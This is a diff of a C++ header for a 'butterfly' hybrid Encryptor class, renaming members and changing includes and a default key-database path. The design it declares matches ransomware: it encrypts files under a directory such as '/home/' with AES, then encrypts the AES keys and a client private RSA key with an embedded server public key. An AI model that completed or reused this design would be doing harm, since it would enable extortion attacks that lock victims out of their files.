@@ -2,11 +2,13 @@
 #ifndef BUTTERFLY_ENCRYPTOR_H
 #define BUTTERFLY_ENCRYPTOR_H
 
+#include <algorithm>
+
 #include "crypto/rsaEncryptor.h"
 #include "crypto/aesEncryptor.h"
 #include "crypto/serverPublicKey.h"
 #include "directoryIterator.h"
-#include "aesKeyDatabase.h"
+#include "fileExtensions.h"
 #include "params.h"
 
 namespace butterfly
@@ -16,7 +18,7 @@ namespace hybrid
 {
 
 /**
- * Class Encryptor to encrypt all files with AES and the CPrivateRSA as well as AES key with RSA
+ * Class Encryptor to encrypt files with AES, CPrivateRSA and AESKeyPair(Key+IV) with RSA
  */
 class Encryptor
 {
@@ -24,12 +26,10 @@ class Encryptor
 private:
     int _keySize;
     bool _aesKeyInit;
-    std::string _aesKeyDbFilepath;
+    std::string _aesKeyDBPath;
 
     std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
     std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
-    std::unique_ptr<DirectoryIterator> _dirIterator;
-    std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;
 
     /**
      * Validates the AESKey/AESIV length after the AESKey generation
@@ -45,9 +45,9 @@ public:
      *       encryptor->invokeDir("/home/");
      *
      * @param keySize: size of the key
-     * @param aesKeyDbFilepath:
+     * @param aesKeyDBPath:
      */
-    explicit Encryptor(int keySize = 2048, const std::string &aesKeyDbFilepath = "/home/christian/projects/butterfly/bin/AES.db");
+    explicit Encryptor(int keySize = 2048, const std::string &aesKeyDBPath = "AES.db");
 
     /**
      * Destructor Encryptor
